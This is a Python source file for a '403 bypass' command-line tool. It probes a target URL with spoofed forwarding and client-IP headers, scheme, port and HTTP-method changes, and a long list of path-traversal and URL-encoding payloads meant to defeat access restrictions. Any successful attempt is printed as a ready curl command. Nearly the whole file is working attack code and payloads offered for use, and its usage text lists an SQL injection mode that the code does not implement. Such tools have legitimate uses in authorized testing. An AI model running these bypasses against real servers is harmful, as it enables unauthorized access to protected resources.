import requests
import sys
import argparse


class Colors:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    CYAN = '\033[96m'
    LT_CYAN = '\033[94m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    END = '\033[0m'


# Utility Functions
def usage():
    print("Usage : \n")
    print("\t403-bypass [URL]\n")
    print("\t-u, --url \t\t target Domain\n")
    print("Bypass Modes: \n")
    print("\t --header \t\t Header Bypass\n")
    print("\t --protocol \t\t Protocol Bypass\n")
    print("\t --port \t\t Port Bypass\n")
    print("\t --HTTPmethod \t\t HTTP Method Bypass\n")
    print("\t --encode \t\t URL Encode Bypass\n")
    print("\t --SQLi \t\t SQL Injection Bypass\n")
    print("\t --exploit \t\t Complete Scan : All bypass modes\n")
    print(f"{Colors.RED}RED\t: 4xx Status Code\n")
    print(f"{Colors.YELLOW}YELLOW\t: 3xx Status Code\n")
    print(f"{Colors.GREEN}GREEN\t: 2xx Status Code\n")
    print(f"{Colors.BLUE}BLUE\t: 5xx Status Code\n{Colors.END}")


def banner():
    print(f"\t\t{Colors.CYAN}==========================={Colors.END}")
    print(f"\t\t{Colors.CYAN}||\t403-bypasser\t ||{Colors.END}")
    print(f"\t\t{Colors.CYAN}==========================={Colors.END}")
    print(f"\t\t{Colors.YELLOW}- GitHub - github.com/mahaveer-choudhary\n{Colors.END}")


def print_status(header_name, code, length, payload=None):
    status_color = Colors.GREEN if code.startswith('2') else \
                   Colors.YELLOW if code.startswith('3') else \
                   Colors.RED
    print(f"{Colors.CYAN}{header_name} Payload: {status_color}Status: {code}{Colors.END}, "
          f"{Colors.CYAN}Length: {length}{Colors.END}")
    if code.startswith('2') and payload:
        print(f"╭{'─' * 115}╮")
        print(f"{Colors.MAGENTA}╰─> PAYLOAD: {Colors.GREEN}{payload}{Colors.END}")
        print(f"╰{'─' * 115}╯")


# Bypass Functions
def header_bypass(target):
    headers_list = [
        ("X-Originally-Forwarded-For", "127.0.0.1, 68.180.194.242"),
        ("X-Originating-", "127.0.0.1, 68.180.194.242"),
        ("X-Originating-IP", "127.0.0.1, 68.180.194.242"),
        ("True-Client-IP", "127.0.0.1, 68.180.194.242"),
        ("X-WAP-Profile", "127.0.0.1, 68.180.194.242"),
        ("From", "127.0.0.1, 68.180.194.242"),
        ("Profile", "http://{target}"),
        ("X-Arbitrary", "http://{target}"),
        ("X-HTTP-DestinationURL", "http://{target}"),
        ("X-Forwarded-Proto", "http://{target}"),
        ("Destination", "127.0.0.1, 68.180.194.242"),
        ("Proxy", "127.0.0.1, 68.180.194.242"),
        ("CF-Connecting_IP", "127.0.0.1, 68.180.194.242"),
        ("CF-Connecting-IP", "127.0.0.1, 68.180.194.242"),
        ("Referer", target),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Custom-IP-Authorization..;/", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Remote-IP", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("X-Host", "127.0.0.1"),
        ("X-Forwarded-Host", "127.0.0.1"),
        ("X-Original-URL", "/anything"),
        # ("X-Rewrite-URL", ),
        ("Content-Length", "0"),
        ("X-ProxyUser-Ip", "127.0.0.1"),
        ("Base-Url", "127.0.0.1"),
        ("Client-IP", "127.0.0.1"),
        ("Http-Url", "127.0.0.1"),
        ("Proxy-Host", "127.0.0.1"),
        ("Proxy-Url", "127.0.0.1"),
        ("Real-Ip", "127.0.0.1"),
        ("Redirect", "127.0.0.1"),
        ("Referrer", "127.0.0.1"),
        ("Request-Uri", "127.0.0.1"),
        ("Uri", "127.0.0.1"),
        ("Url", "127.0.0.1"),
        ("X-Forward-For", "127.0.0.1"),
        ("X-Forwarded-By", "127.0.0.1"),
        ("X-Forwarded-For-Original", "127.0.0.1"),
        ("X-Forwarded-Server", "127.0.0.1"),
        ("X-Forwarded", "127.0.0.1"),
        ("X-Forwarder-For", "127.0.0.1"),
        ("X-Http-Destinationurl", "127.0.0.1"),
        ("X-Http-Host-Override", "127.0.0.1"),
        ("X-Original-Remote-Addr", "127.0.0.1"),
        ("X-Proxy-Url", "127.0.0.1"),
        ("X-Real-Ip", "127.0.0.1"),
        ("X-Remote-Addr", "127.0.0.1"),
        ("X-OReferrer", "https%3A%2F%2Fwww.google.com%2F"),
    ]
    print(f"\n{Colors.LT_CYAN}[+] HTTP Header Bypass{Colors.END}")
    for header_name, header_value in headers_list:
        try:
            response = requests.get(target, headers={header_name: header_value})
            code = str(response.status_code)
            length = len(response.content)
            payload = f"curl -ks -H '{header_name}: {header_value}' -X GET '{target}'"
            print_status(header_name, code, length, payload)
        except requests.RequestException as e:
            print(f"{Colors.RED}Error with {header_name}: {e}{Colors.END}")


def protocol_bypass(target):
    print(f"\n{Colors.LT_CYAN}[+] Protocol Bypass{Colors.END}")
    schemes = ["http://", "https://"]
    for scheme in schemes:
        try:
            url = scheme + target.split("://")[-1]
            response = requests.get(url)
            code = str(response.status_code)
            length = len(response.content)
            print_status(scheme, code, length)
        except requests.RequestException as e:
            print(f"{Colors.RED}Error with {scheme}: {e}{Colors.END}")


def port_bypass(target):
    print(f"\n{Colors.LT_CYAN}[+] Port-Based Bypass{Colors.END}")
    ports = [80, 443, 8080, 8443]
    for port in ports:
        try:
            url = f"{target}:{port}"
            response = requests.get(url)
            code = str(response.status_code)
            length = len(response.content)
            print_status(f"Port {port}", code, length)
        except requests.RequestException as e:
            print(f"{Colors.RED}Error with port {port}: {e}{Colors.END}")


def http_method_bypass(target):
    print(f"\n{Colors.LT_CYAN}[+] HTTP Method Bypass{Colors.END}")
    methods = ["GET", "POST", "HEAD", "PUT", "DELETE"]
    for method in methods:
        try:
            response = requests.request(method, target)
            code = str(response.status_code)
            length = len(response.content)
            print_status(method, code, length)
        except requests.RequestException as e:
            print(f"{Colors.RED}Error with {method}: {e}{Colors.END}")


def bypass_403(target):
    print(f"{Colors.MAGENTA}Running all bypasses for {target}{Colors.END}")
    header_bypass(target)
    protocol_bypass(target)
    port_bypass(target)
    url_encode_bypass(target)
    http_method_bypass(target)


def url_encode_bypass(target): 
    print(f"\n{Colors.LT_CYAN}[+] URL Encode Method Bypass {Colors.END}")
    
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"

    payloads = [    
        "#?",
        "#?",
        "%09",
        "%%%%09",
        "%09%3b",
        "%%%%09%%%%3b",
        "%09..",
        "%%%%09..",
        "%09;",
        "%%%%09;",
        "%20",
        "%%%%20",
        "%23%3f",
        "%%%%23%%%%3f",
        "%252f%252f",
        "%%%%252f%%%%252f",
        "%252f/",
        "%%%%252f/",
        "%2e%2e",
        "%%%%2e%%%%2e",
        "%2e%2e/",
        "%%%%2e%%%%2e/",
        "%2f",
        "%%%%2f",
        "%2f%20%23",
        "%%%%2f%%%%20%%%%23",
        "%2f%23",
        "%%%%2f%%%%23",
        "%2f%2f",
        "%%%%2f%%%%2f",
        "%2f%3b%2f",
        "%%%%2f%%%%3b%%%%2f",
        "%2f%3b%2f%2f",
        "%%%%2f%%%%3b%%%%2f%%%%2f",
        "%2f%3f",
        "%%%%2f%%%%3f",
        "%2f%3f/",
        "%%%%2f%%%%3f/",
        "%2f/",
        "%%%%2f/",
        "%3b",
        "%%%%3b",
        "%3b%09",
        "%%%%3b%%%%09",
        "%3b%2f%2e%2e",
        "%%%%3b%%%%2f%%%%2e%%%%2e",
        "%3b%2f%2e%2e%2f%2e%2e%2f%2f",
        "%%%%3b%%%%2f%%%%2e%%%%2e%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f",
        "%3b%2f%2e.",
        "%%%%3b%%%%2f%%%%2e.",
        "%3b%2f..",
        "%%%%3b%%%%2f..",
        "%3b/%2e%2e/..%2f%2f",
        "%%%%3b/%%%%2e%%%%2e/..%%%%2f%%%%2f",
        "%3b/%2e.",
        "%%%%3b/%%%%2e.",
        "%3b/%2f%2f../",
        "%%%%3b/%%%%2f%%%%2f../",
        "%3b/..",
        "%%%%3b/..",
        "%3b//%2f../",
        "%%%%3b//%%%%2f../",
        "%3f%23",
        "%%%%3f%%%%23",
        "%3f%3f",
        "%%%%3f%%%%3f",
        "..",
        "..",
        "..%00/;",
        "..%%%%00/;",
        "..%00;/",
        "..%%%%00;/",
        "..%09",
        "..%%%%09",
        "..%0d/;",
        "..%%%%0d/;",
        "..%0d;/",
        "..%%%%0d;/",
        "..%5c/",
        "..%%%%5c/",
        "..%ff/;",
        "..%%%%ff/;",
        "..%ff;/",
        "..%%%%ff;/",
        "..;%00/",
        "..;%%%%00/",
        "..;%0d/",
        "..;%%%%0d/",
        "..;%ff/",
        "..;%%%%ff/",
        "/%20#",
        "/%%%%20#",
        "/%20%23",
        "/%%%%20%%%%23",
        "/%252e%252e%252f/",
        "/%%%%252e%%%%252e%%%%252f/",
        "/%252e%252e%253b/",
        "/%%%%252e%%%%252e%%%%253b/",
        "/%252e%252f/",
        "/%%%%252e%%%%252f/",
        "/%252e%253b/",
        "/%%%%252e%%%%253b/",
        "/%252e/",
        "/%%%%252e/",
        "/%252f",
        "/%%%%252f",
        "/%2e%2e",
        "/%%%%2e%%%%2e",
        "/%2e%2e%3b/",
        "/%%%%2e%%%%2e%%%%3b/",
        "/%2e%2e/",
        "/%%%%2e%%%%2e/",
        "/%2e%2f/",
        "/%%%%2e%%%%2f/",
        "/%2e%3b/",
        "/%%%%2e%%%%3b/",
        "/%2e%3b//",
        "/%%%%2e%%%%3b//",
        "/%2e/",
        "/%%%%2e/",
        "/%2e//",
        "/%%%%2e//",
        "/%2f",
        "/%%%%2f",
        "/%3b/",
        "/%%%%3b/",
        "/..",
        "/..",
        "/..%2f",
        "/..%%%%2f",
        "/..%2f..%2f",
        "/..%%%%2f..%%%%2f",
        "/..%2f..%2f..%2f",
        "/..%%%%2f..%%%%2f..%%%%2f",
        "/../",
        "/../",
        "/../../",
        "/../../",
        "/../../../",
        "/../../../",
        "/../../..//",
        "/../../..//",
        "/../..//",
        "/../..//",
        "/../..//../",
        "/../..//../",
        "/../..;/",
        "/../..;/",
        "/.././../",
        "/.././../",
        "/../.;/../",
        "/../.;/../",
        "/..//",
        "/..//",
        "/..//../",
        "/..//../",
        "/..//../../",
        "/..//../../",
        "/..//..;/",
        "/..//..;/",
        "/../;/",
        "/../;/",
        "/../;/../",
        "/../;/../",
        "/..;%2f",
        "/..;%%%%2f",
        "/..;%2f..;%2f",
        "/..;%%%%2f..;%%%%2f",
        "/..;%2f..;%2f..;%2f",
        "/..;%%%%2f..;%%%%2f..;%%%%2f",
        "/..;/../",
        "/..;/../",
        "/..;/..;/",
        "/..;/..;/",
        "/..;//",
        "/..;//",
        "/..;//../",
        "/..;//../",
        "/..;//..;/",
        "/..;//..;/",
        "/..;/;/",
        "/..;/;/",
        "/..;/;/..;/",
        "/..;/;/..;/",
        "/.//",
        "/.//",
        "/.;/",
        "/.;/",
        "/.;//",
        "/.;//",
        "//..",
        "//..",
        "//../../",
        "//../../",
        "//..;",
        "//..;",
        "//./",
        "//./",
        "//.;/",
        "//.;/",
        "///..",
        "///..",
        "///../",
        "///../",
        "///..//",
        "///..//",
        "///..;",
        "///..;",
        "///..;/",
        "///..;/",
        "///..;//",
        "///..;//",
        "//;/",
        "//;/",
        "/;/",
        "/;/",
        "/;//",
        "/;//",
        "/;x",
        "/;x",
        "/;x/",
        "/;x/",
        "/x/../",
        "/x/../",
        "/x/..//",
        "/x/..//",
        "/x/../;/",
        "/x/../;/",
        "/x/..;/",
        "/x/..;/",
        "/x/..;//",
        "/x/..;//",
        "/x/..;/;/",
        "/x/..;/;/",
        "/x//../",
        "/x//../",
        "/x//..;/",
        "/x//..;/",
        "/x/;/../",
        "/x/;/../",
        "/x/;/..;/",
        "/x/;/..;/",
        ";",
        ";",
        ";%09",
        ";%%%%09",
        ";%09..",
        ";%%%%09..",
        ";%09..;",
        ";%%%%09..;",
        ";%09;",
        ";%%%%09;",
        ";%2F..",
        ";%%%%2F..",
        ";%2f%2e%2e",
        ";%%%%2f%%%%2e%%%%2e",
        ";%2f%2e%2e%2f%2e%2e%2f%2f",
        ";%%%%2f%%%%2e%%%%2e%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f",
        ";%2f%2f/../",
        ";%%%%2f%%%%2f/../",
        ";%2f..",
        ";%%%%2f..",
        ";%2f..%2f%2e%2e%2f%2f",
        ";%%%%2f..%%%%2f%%%%2e%%%%2e%%%%2f%%%%2f",
        ";%2f..%2f..%2f%2f",
        ";%%%%2f..%%%%2f..%%%%2f%%%%2f",
        ";%2f..%2f/",
        ";%%%%2f..%%%%2f/",
        ";%2f..%2f/..%2f",
        ";%%%%2f..%%%%2f/..%%%%2f",
        ";%2f..%2f/../",
        ";%%%%2f..%%%%2f/../",
        ";%2f../%2f..%2f",
        ";%%%%2f../%%%%2f..%%%%2f",
        ";%2f../%2f../",
        ";%%%%2f../%%%%2f../",
        ";%2f..//..%2f",
        ";%%%%2f..//..%%%%2f",
        ";%2f..//../",
        ";%%%%2f..//../",
        ";%2f..///",
        ";%%%%2f..///",
        ";%2f..///;",
        ";%%%%2f..///;",
        ";%2f..//;/",
        ";%%%%2f..//;/",
        ";%2f..//;/;",
        ";%%%%2f..//;/;",
        ";%2f../;//",
        ";%%%%2f../;//",
        ";%2f../;/;/",
        ";%%%%2f../;/;/",
        ";%2f../;/;/;",
        ";%%%%2f../;/;/;",
        ";%2f..;///",
        ";%%%%2f..;///",
        ";%2f..;//;/",
        ";%%%%2f..;//;/",
        ";%2f..;/;//",
        ";%%%%2f..;/;//",
        ";%2f/%2f../",
        ";%%%%2f/%%%%2f../",
        ";%2f//..%2f",
        ";%%%%2f//..%%%%2f",
        ";%2f//../",
        ";%%%%2f//../",
        ";%2f//..;/",
        ";%%%%2f//..;/",
        ";%2f/;/../",
        ";%%%%2f/;/../",
        ";%2f/;/..;/",
        ";%%%%2f/;/..;/",
        ";%2f;//../",
        ";%%%%2f;//../",
        ";%2f;/;/..;/",
        ";%%%%2f;/;/..;/",
        ";/%2e%2e",
        ";/%%%%2e%%%%2e",
        ";/%2e%2e%2f%2f",
        ";/%%%%2e%%%%2e%%%%2f%%%%2f",
        ";/%2e%2e%2f/",
        ";/%%%%2e%%%%2e%%%%2f/",
        ";/%2e%2e/",
        ";/%%%%2e%%%%2e/",
        ";/%2e.",
        ";/%%%%2e.",
        ";/%2f%2f../",
        ";/%%%%2f%%%%2f../",
        ";/%2f/..%2f",
        ";/%%%%2f/..%%%%2f",
        ";/%2f/../",
        ";/%%%%2f/../",
        ";/.%2e",
        ";/.%%%%2e",
        ";/.%2e/%2e%2e/%2f",
        ";/.%%%%2e/%%%%2e%%%%2e/%%%%2f",
        ";/..",
        ";/..",
        ";/..%2f",
        ";/..%%%%2f",
        ";/..%2f%2f../",
        ";/..%%%%2f%%%%2f../",
        ";/..%2f..%2f",
        ";/..%%%%2f..%%%%2f",
        ";/..%2f/",
        ";/..%%%%2f/",
        ";/..%2f//",
        ";/..%%%%2f//",
        ";/../",
        ";/../",
        ";/../%2f/",
        ";/../%%%%2f/",
        ";/../../",
        ";/../../",
        ";/../..//",
        ";/../..//",
        ";/.././../",
        ";/.././../",
        ";/../.;/../",
        ";/../.;/../",
        ";/..//",
        ";/..//",
        ";/..//%2e%2e/",
        ";/..//%%%%2e%%%%2e/",
        ";/..//%2f",
        ";/..//%%%%2f",
        ";/..//../",
        ";/..//../",
        ";/..///",
        ";/..///",
        ";/../;/",
        ";/../;/",
        ";/../;/../",
        ";/../;/../",
        ";/..;",
        ";/..;",
        ";/.;.",
        ";/.;.",
        ";//%2f../",
        ";//%%%%2f../",
        ";//..",
        ";//..",
        ";//../../",
        ";//../../",
        ";///..",
        ";///..",
        ";///../",
        ";///../",
        ";///..//",
        ";///..//",
        ";x",
        ";x",
        ";x/",
        ";x/",
        ";x;",
        ";x;",
        "&",
        "&",
        "%",
        "%%%%",
        "%09",
        "%%%%09",
        "../",
        "../",
        "..%2f",
        "..%%%%2f",
        ".././",
        ".././",
        "..%00/",
        "..%%%%00/",
        "..%0d/",
        "..%%%%0d/",
        "..%5c",
        "..%%%%5c",
        "..%ff",
        "..%%%%ff",
        "%2e%2e%2f",
        "%%%%2e%%%%2e%%%%2f",
        ".%2e/",
        ".%%%%2e/",
        "%3f",
        "%%%%3f",
        "%26",
        "%%%%26",
        "%23",
        "%%%%23",
        "%2e",
        "%%%%2e",
        "/.",
        "/.",
        "?",
        "?",
        "??",
        "??",
        "???",
        "???",
        "//",
        "//",
        "/./",
        "/./",
        ".//./",
        ".//./",
        "//?anything",
        "//?anything",
        "#",
        "#",
        "/",
        "/",
        "/.randomstring",
        "/.randomstring",
        "..;/",
        "..;/",
        ".html",
        ".html",
        "%20/",
        "%%%%20/",
        "/%20%20/",
        "/%%%%20%%%%20/",
        ".json",
        ".json",
        "/*",
        "/*",
        "./.",
        "./.",
        "/*/",
        "/*/",
        "/..;/",
        "/..;/",
        "/%2e/",
        "/%%%%2e/",
        "/%2e/",
        "/%%%%2e/",
        "//.",
        "//.",
        "////",
        "////",
        "/../",
        "/../",
        "/;/",
        "/;/",
    ]

    for payload in payloads : 
        url = f"{target}{payload}"

        try : 
            response = requests.get(url, headers={"User-Agent": user_agent}, verify=True)
            code = str(response.status_code)
            length = len(response.content)

            curl_payload = f"curl -k -s '{url}' -H 'User-Agent: {user_agent}'"
            print_status(payload, code, length, curl_payload if code == "200" else None)

        except requests.RequestException as e : 
            print(f"{Colors.RED}Error with payload [{payload}]: {e}{Colors.END}")

# Main Execution Flow
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="403 Bypass Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--header", action="store_true", help="Header Bypass")
    parser.add_argument("--protocol", action="store_true", help="Protocol Bypass")
    parser.add_argument("--port", action="store_true", help="Port Bypass")
    parser.add_argument("--HTTPmethod", action="store_true", help="HTTP Method Bypass")
    parser.add_argument('--encode', action='store_true', help='URL Encode Bypass')
    parser.add_argument("--exploit", action="store_true", help="Run all bypasses")

    args = parser.parse_args()
    if args.url:
        target = args.url
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target

        banner()
        if args.header:
            header_bypass(target)
        elif args.protocol:
            protocol_bypass(target)
        elif args.port:
            port_bypass(target)
        elif args.HTTPmethod:
            http_method_bypass(target)
        elif args.encode:
            url_encode_bypass(target)
        elif args.exploit:
            bypass_403(target)
        else:
            usage()
    else:
        usage()
